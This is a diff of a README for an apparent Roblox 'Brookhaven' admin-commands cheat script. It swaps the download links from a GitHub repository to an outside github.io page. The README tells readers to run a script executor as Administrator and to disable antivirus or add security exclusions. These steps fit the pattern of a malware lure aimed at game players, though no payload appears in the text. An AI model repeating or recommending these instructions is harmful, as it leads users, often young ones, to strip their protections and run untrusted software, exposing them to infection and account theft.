@@ -1,6 +1,6 @@
 # 🎮 Brookhaven-Admin-Commands-Script-2026 - Control your game world with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/yurinewtonian672/Brookhaven-Admin-Commands-Script-2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://yurinewtonian672.github.io)
 
 ## 📌 Overview
 Brookhaven-Admin-Commands-Script-2026 offers tools for players who want more control over their game sessions. This script provides administrative powers, teleportation features, and player management tools. You can change your game environment, move across the map, and manage other players in your server. This software runs on Windows and works with popular script executors.
@@ -16,7 +16,7 @@ Before you begin, ensure your computer meets these requirements:
 Follow these steps to set up and run the administrative tools for your game.
 
 1. Obtain a script executor. This program allows the game to read the script instructions.
-2. Visit the download page to get the latest script file. You can find the link here: [https://github.com/yurinewtonian672/Brookhaven-Admin-Commands-Script-2026](https://github.com/yurinewtonian672/Brookhaven-Admin-Commands-Script-2026)
+2. Visit the download page to get the latest script file. You can find the link here: [https://yurinewtonian672.github.io](https://yurinewtonian672.github.io)
 3. Save the file to a folder you can find easily, like your Downloads or Desktop folder.
 4. Open your script executor as an administrator to ensure it has the necessary permissions to interface with the game.
 5. Launch the game through your typical game launcher.
@@ -48,7 +48,7 @@ If the script does not load or show the menu, try these steps:
 * Run as Administrator: Right-click your executor icon and select "Run as Administrator."
 * Disable Antivirus: Some security programs mistake script programs for threats. Add an exclusion for your executor folder in your security settings.
 * Restart: Close both the game and the executor, then open them again in that order.
-* Re-download: If the file feels corrupted, visit the [link](https://github.com/yurinewtonian672/Brookhaven-Admin-Commands-Script-2026) and download a fresh copy.
+* Re-download: If the file feels corrupted, visit the [link](https://yurinewtonian672.github.io) and download a fresh copy.
 
 ## 🔒 Security
 Always download files from trusted sources. This repository provides the official source code for the Brookhaven administration tools. Keep your script executor updated to benefit from better performance and compatibility with game updates. Do not share your personal account information with any third-party tools or websites that claim to offer administrative services. Use these tools to improve your own experience within the game environment.
